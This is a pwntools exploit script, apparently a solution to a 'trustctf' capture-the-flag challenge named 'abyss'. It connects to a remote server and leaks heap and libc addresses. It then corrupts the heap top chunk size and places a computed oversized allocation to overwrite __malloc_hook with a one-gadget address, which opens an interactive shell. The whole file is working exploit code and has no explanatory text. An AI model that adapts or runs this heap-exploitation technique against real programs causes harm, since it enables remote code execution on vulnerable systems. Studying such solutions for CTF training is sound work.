from pwn import *

#p = process('./abyss')
p = remote('server.trustctf.com', 29384)
e = ELF('./abyss')
l = e.libc

p.recvuntil('oxygen : 0x')
heap = int(p.recvline()[:-1], 16)
top = heap + 0x5a0

log.info('heap base : ' + str(hex(heap)))
log.info('top chunk : ' + str(hex(top)))

p.recvuntil('>> ')
p.sendline('1')
p.recvuntil(':')
p.sendline('2')

p.recvuntil('>> ')
p.sendline('1')
p.recvuntil(':')
p.sendline('2')

for i in range(3):
	p.recvuntil('>> ')
	p.sendline('2')

p.recvuntil('>> ')
p.sendline('4')

p.recvuntil('>> ')
p.sendline('1')
p.recvuntil(':')
p.sendline('-1')

p.recvuntil('>> ')
p.sendline('3')
p.recvuntil(':')
p.send('AAAA')
pause()
p.recv()
p.recvuntil('A'*4)

libc = u64(p.recv(6).ljust(8, '\x00')) - 0x3c4b78
hook = libc+l.symbols['__malloc_hook']
magic = libc + 0xf02a4

log.info('libc : ' + str(hex(libc)))
log.info('malloc_hook : ' + str(hex(hook)))

p.recvuntil('>> ')
p.sendline('1')
p.recvuntil(':')
p.sendline('7')

p.recvuntil('>> ')
p.sendline('4')

p.recvuntil('>> ')
p.sendline('3')
p.recvuntil(':')
p.send('\xff' * 156)

evil = hook - 0x10 - top
log.info('evil size : ' + str(evil) + '(' + str(hex(evil))+')')

p.recvuntil('>> ')
p.sendline('1')
p.recvuntil(':')
p.sendline('1')

p.recvuntil(':')
p.sendline(str(evil))
p.recvuntil(':')
p.send(p64(magic))

p.interactive()
